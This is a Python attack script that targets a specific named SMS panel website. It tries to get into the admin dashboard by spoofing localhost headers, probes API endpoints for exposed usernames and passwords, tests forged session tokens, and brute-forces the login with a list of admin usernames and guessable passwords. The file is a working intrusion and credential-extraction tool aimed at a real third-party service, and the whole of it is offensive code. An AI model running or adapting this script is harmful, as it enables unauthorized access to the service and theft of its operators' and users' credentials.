import requests
import json
import gzip
from io import BytesIO

class IPRNAdvancedBypass:
    def __init__(self):
        self.base_url = "https://panel.iprn-sms.com"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
        })
    
    def bypass_dashboard_access(self):
        """Akses dashboard dengan header bypass"""
        print("[*] Attempting dashboard bypass with X-Forwarded-For header...")
        
        bypass_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Original-URL': '/dashboard',
            'X-Remote-Addr': 'localhost'
        }
        
        try:
            r = requests.get(
                f'{self.base_url}/dashboard',
                headers={**self.session.headers, **bypass_headers},
                timeout=15,
                allow_redirects=False
            )
            
            print(f"[+] Status Code: {r.status_code}")
            print(f"[+] Content-Type: {r.headers.get('Content-Type')}")
            print(f"[+] Content-Length: {len(r.content)} bytes")
            
            # Decode gzip jika perlu
            content = r.content
            if r.headers.get('Content-Encoding') == 'gzip':
                try:
                    content = gzip.decompress(content)
                    print("[+] Gzip decoded successfully")
                except:
                    pass
            
            # Decode ke string
            try:
                html = content.decode('utf-8', errors='ignore')
                print(f"[+] Decoded content length: {len(html)} chars")
                print("\n[+] Content preview:")
                print("=" * 70)
                print(html[:1500])
                print("=" * 70)
                
                # Cari credentials atau tokens dalam HTML
                if 'admin' in html.lower() or 'dashboard' in html.lower():
                    print("\n[SUCCESS] Dashboard accessible!")
                    
                    # Cek cookies
                    if r.cookies:
                        print("\n[+] Cookies received:")
                        for cookie_name, cookie_value in r.cookies.items():
                            print(f"    {cookie_name}: {cookie_value}")
                    
                    return html
                
            except Exception as e:
                print(f"[!] Decode error: {e}")
            
            return None
            
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def enumerate_api_with_bypass(self):
        """Enumerasi API endpoints dengan bypass headers"""
        print("\n[*] Enumerating API endpoints with bypass headers...")
        
        bypass_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1'
        }
        
        endpoints = [
            '/api/users',
            '/api/admin',
            '/api/sms',
            '/api/balance',
            '/api/settings',
            '/api/config',
            '/api/account',
            '/api/profile',
            '/dashboard/api/user',
            '/dashboard/api/settings',
        ]
        
        findings = []
        
        for endpoint in endpoints:
            try:
                r = requests.get(
                    f'{self.base_url}{endpoint}',
                    headers={**self.session.headers, **bypass_headers},
                    timeout=10
                )
                
                if r.status_code == 200:
                    print(f"\n[+] ACCESSIBLE: {endpoint}")
                    print(f"    Status: {r.status_code}")
                    print(f"    Length: {len(r.text)} bytes")
                    
                    try:
                        data = r.json()
                        print(f"    JSON Response:")
                        print(json.dumps(data, indent=4)[:500])
                        
                        # Cari credentials
                        if 'username' in str(data).lower() or 'password' in str(data).lower():
                            print("\n    [!!!] POTENTIAL CREDENTIALS FOUND [!!!]")
                            findings.append((endpoint, data))
                            
                    except:
                        print(f"    Preview: {r.text[:300]}")
                        
            except Exception as e:
                pass
        
        return findings
    
    def test_session_hijacking(self):
        """Test session manipulation"""
        print("\n[*] Testing session hijacking techniques...")
        
        # Test dengan fake session tokens
        fake_sessions = [
            'admin_session_123456',
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.test',
            '00000000-0000-0000-0000-000000000000',
        ]
        
        for token in fake_sessions:
            try:
                cookies = {'session': token, 'auth_token': token, 'PHPSESSID': token}
                
                r = requests.get(
                    f'{self.base_url}/dashboard',
                    cookies=cookies,
                    headers=self.session.headers,
                    timeout=10,
                    allow_redirects=False
                )
                
                if r.status_code != 302 and r.status_code == 200:
                    print(f"[+] Token accepted: {token[:30]}")
                    print(f"    Status: {r.status_code}")
                    
            except:
                pass
        
        return None
    
    def brute_force_smart(self):
        """Smart bruteforce dengan analisa response timing dan length"""
        print("\n[*] Smart bruteforce attack...")
        
        # Username targets
        usernames = ['admin', 'administrator', 'root', 'owner', 'superadmin', 'iprn']
        
        # Password list targeted untuk SMS panel
        passwords = [
            'admin', 'admin123', 'Admin@123', 'password', 'Password123',
            'iprn', 'iprn123', 'iprn2024', 'iprn2025', 'iprn2026',
            'sms123', 'smspanel', 'panel123', 'panel2026',
            '123456', '12345678', '123456789',
            'root', 'toor', 'qwerty', 'letmein',
        ]
        
        # Track response patterns
        response_lengths = {}
        
        for username in usernames:
            print(f"\n[*] Testing username: {username}")
            
            for password in passwords:
                try:
                    # Test POST ke /login dengan form data
                    payload = {
                        'username': username,
                        'password': password,
                        'submit': 'Login'
                    }
                    
                    r = self.session.post(
                        f'{self.base_url}/login',
                        data=payload,
                        timeout=10,
                        allow_redirects=False
                    )
                    
                    # Analisa response
                    resp_length = len(r.content)
                    resp_time = r.elapsed.total_seconds()
                    
                    print(f"  [{username}:{password}] Status:{r.status_code} Len:{resp_length} Time:{resp_time:.2f}s", end='')
                    
                    # Success indicators
                    if r.status_code == 302:  # Redirect = kemungkinan success
                        location = r.headers.get('Location', '')
                        if 'dashboard' in location or 'admin' in location or 'panel' in location:
                            print(f" [REDIRECT TO {location}]")
                            print(f"\n[!!!] POTENTIAL VALID CREDENTIALS [!!!]")
                            print(f"Username: {username}")
                            print(f"Password: {password}")
                            
                            # Test akses dashboard dengan session
                            r2 = self.session.get(f'{self.base_url}/dashboard', allow_redirects=False)
                            if r2.status_code == 200:
                                print("[!!!] CONFIRMED - Dashboard accessible!")
                                return (username, password, self.session.cookies.get_dict())
                        else:
                            print(f" [REDIRECT TO {location}]")
                    
                    elif r.status_code == 200:
                        # Cek apakah response berbeda dari yang gagal
                        if 'invalid' not in r.text.lower() and 'error' not in r.text.lower():
                            if 'dashboard' in r.text.lower() or 'welcome' in r.text.lower():
                                print(f" [SUCCESS KEYWORDS FOUND]")
                                print(f"\n[!!!] POTENTIAL VALID CREDENTIALS [!!!]")
                                print(f"Username: {username}")
                                print(f"Password: {password}")
                                return (username, password, r.text[:500])
                    
                    # Track anomalies dalam response length
                    if resp_length not in response_lengths:
                        response_lengths[resp_length] = []
                    response_lengths[resp_length].append((username, password))
                    
                    print()  # Newline
                    
                except Exception as e:
                    print(f" [Error: {e}]")
        
        # Analisa anomalies
        print("\n[*] Response length analysis:")
        for length, creds in sorted(response_lengths.items()):
            print(f"  Length {length}: {len(creds)} attempts")
            if len(creds) == 1:  # Outlier = possible valid cred
                print(f"    [!] OUTLIER: {creds[0]}")
        
        return None
    
    def run_attack(self):
        print("=" * 70)
        print("  IPRN-SMS ADVANCED BYPASS & CREDENTIAL EXTRACTION")
        print("=" * 70)
        
        # 1. Dashboard bypass
        result = self.bypass_dashboard_access()
        
        # 2. API enumeration dengan bypass
        findings = self.enumerate_api_with_bypass()
        if findings:
            print("\n[!!!] CREDENTIALS FOUND IN API [!!!]")
            for endpoint, data in findings:
                print(f"\nEndpoint: {endpoint}")
                print(json.dumps(data, indent=2))
                return data
        
        # 3. Session hijacking
        result = self.test_session_hijacking()
        if result:
            return result
        
        # 4. Smart bruteforce
        result = self.brute_force_smart()
        if result:
            return result
        
        print("\n[*] Attack completed. Review findings above.")
        return None


if __name__ == "__main__":
    attacker = IPRNAdvancedBypass()
    result = attacker.run_attack()
    
    if result:
        print("\n" + "=" * 70)
        print("  [SUCCESS] VALID CREDENTIALS EXTRACTED!")
        print("=" * 70)
        print(json.dumps(result if isinstance(result, dict) else str(result), indent=2))
